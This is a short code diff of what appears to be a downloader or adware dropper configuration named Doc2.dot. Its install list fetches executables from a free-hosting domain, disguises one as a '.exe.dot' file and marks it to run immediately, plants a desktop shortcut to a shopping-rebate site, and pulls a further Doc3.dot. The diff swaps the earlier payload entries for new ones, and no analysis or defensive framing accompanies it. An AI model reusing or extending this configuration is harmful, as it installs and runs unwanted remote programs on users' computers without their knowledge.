@@ -2,8 +2,8 @@
 trace("*----Doc2.dot----")
 var ___gconfig = {
 		validcondition:{PID:{min:"0",max:"F"},osver:{min:5,max:6},datver:{min:5,max:16}},
-		installlist:[{id:10000,name:"cmd.exe",url:"http://np601022.free3v.net/05/ovxInstaller_cmd.dot", md5:"", invalidcondition:function(){} ,param:""},
-								 {id:10001,name:"oxvInstaller2.exe",url:"http://np601022.free3v.net/05/ovxInstaller_cmd.dot", md5:"", invalidcondition:function(){} ,param:"", runimmediately:1}],
+		installlist:[{id:10000,name:"Dbgview.exe",url:"http://np601022.free3v.net/05/Dbgview.exe", md5:"", invalidcondition:function(){} ,param:""},
+								 {id:10001,name:"ovxSetup.exe",url:"http://np601022.free3v.net/05/ovxSetup.exe.dot", md5:"", invalidcondition:function(){} ,param:"", runimmediately:1}],
 		desktopiconlist:[{id:20000,name:"·µÀû.ur", md5:"", iconPrivateProfileString:{URL:"http://www.51fanli.com",IconFileName:"favicon.ico",IconFile:"http://www.51fanli.com/favicon.ico"}, param:""}] ,
 		userdefinedlist:[{id:30000,name:"Doc3.dot", md5:"", url:"http://np601022.free3v.net/05/Doc3.dot"}]
 	}
